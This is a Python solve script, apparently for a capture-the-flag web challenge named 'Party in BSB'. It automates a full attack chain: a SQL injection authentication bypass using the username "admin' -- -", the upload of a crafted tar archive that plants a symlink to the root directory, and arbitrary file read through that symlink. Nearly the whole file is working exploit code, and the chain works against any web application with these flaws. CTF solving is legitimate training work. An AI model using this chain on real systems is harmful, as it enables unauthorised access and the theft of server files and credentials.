#!/usr/bin/env python3
"""Party in BSB — WEB. Full chain: SQLi auth bypass -> TarSlip symlink -> file read.

Usage: python3 solve.py http://HOST:PORT [remote_file]
  remote_file defaults to /flag.txt

Run by the user against the live instance. Not executed from the repo.
"""
import io
import re
import sys
import tarfile

import requests  # only runtime dep


def build_symlink_tar(name="x", target="/"):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        info = tarfile.TarInfo(name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        tar.addfile(info)
    return buf.getvalue()


def csrf_of(html):
    m = re.search(r'name="csrf" value="([^"]+)"', html)
    if not m:
        raise SystemExit("csrf token not found")
    return m.group(1)


def solve(base, remote_file="/flag.txt"):
    base = base.rstrip("/")
    s = requests.Session()

    # 1. SQLi auth bypass
    token = csrf_of(s.get(f"{base}/admin/login").text)
    s.post(f"{base}/admin/login",
           data={"csrf": token, "username": "admin' -- -", "password": "x"})
    assert "admin_id" in s.cookies.get("session", ""), "login failed"

    # 2. TarSlip: plant symlink x -> /
    token2 = csrf_of(s.get(f"{base}/admin").text)
    s.post(f"{base}/admin/import",
           data={"csrf": token2},
           files={"arquivo": ("x.tar.gz", build_symlink_tar(), "application/gzip")})

    # 3. Read target through the symlink (strip leading / -> x/<path>)
    rel = "x/" + remote_file.lstrip("/")
    r = s.get(f"{base}/admin/download", params={"path": rel})
    return r.text


if __name__ == "__main__":
    if len(sys.argv) < 2:
        raise SystemExit(__doc__)
    target = sys.argv[2] if len(sys.argv) > 2 else "/flag.txt"
    print(solve(sys.argv[1], target).strip())
